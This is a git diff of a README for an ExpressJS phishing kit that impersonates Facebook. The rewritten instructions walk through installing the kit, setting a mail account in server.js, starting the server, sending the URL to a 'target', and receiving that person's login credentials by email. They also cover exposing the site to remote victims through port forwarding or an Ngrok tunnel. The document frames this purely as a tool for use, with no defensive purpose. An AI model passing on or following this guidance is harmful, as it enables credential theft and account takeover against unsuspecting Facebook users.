@@ -1,21 +1,29 @@
 # Phising Site
-This is a Phising site use for performing Phising-attack on Facebook
-## USAGES
+This is a small website for `Phishing Attacks` for Facebook using `ExpressJS`
+
+## Installation
+### Installation
+````powershell
+npm install
+# or
+# yarn install
 ````
-npm install \\ Install all the required modules
-````
-Above command install all the Module required which are mentioned in package.json file
+The above command installs all the packages required which are mentioned in the package.json file
+
+### Configure
+Open the [server.js](/server.js) file and update the variables as follows
+
+### Execute
 ````
 npm start
 ````
-It will start the server and start listenning at port 3000.
-Once you hit enter and it shows something like
+This command starts the server on port 3000. Once the server is started, you will see something like
 ````
 Listening at https://localhost:3000
 ````
-then you are good to go. Visit the given side i.e. http://localhost:3000. Once you Sign Up in this website your credentials will be messaged to given Email Address
-If you wanna use this template for phising in Remote network,  then you must PORT forward you router or Use NGROK has a Tunnel Host.
-visit https://ngrok.com/ for NGROK
+After the server is started, all you have to do is share the URL `https://localhost:3000` with your target. Once the target sign-in to "Facebook" through the phishing site, you will get mail to the email provided in the code with the target's credentials.
+
+If you want to phish remotely, you either have to `PORT Forward` the required port i.e.` 3000`, or use Tunneling Host: [Ngrok](https://ngrok.com/)
 
 ## NOTE
 __MUST CHANGE THE ASSISGNMENT OF VARIABLE USEREMAIL AND USERPASS TO YOUR CREDENTIALS OR CREATE ENVIRONMENT WITH NAME useremail / userpass for Credential__
